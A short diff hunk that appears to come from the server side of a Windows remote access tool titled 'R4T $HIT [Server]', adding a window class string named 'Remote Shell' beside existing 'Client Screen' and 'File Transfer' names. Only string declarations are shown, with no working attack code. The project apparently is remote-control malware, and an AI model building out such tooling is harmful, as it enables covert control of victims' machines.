@@ -4,6 +4,7 @@ wchar_t g_szClassName[] = L"Server";
 const wchar_t* wn_title = L"R4T $HIT [Server]";
 wchar_t g_szClientClassName[] = L"Client Screen";
 wchar_t g_szClientFTPClassName[] = L"File Transfer";
+wchar_t g_szClientCMDClassName_g[] = L"Remote Shell";
 
 HWND hwndFileList;
 
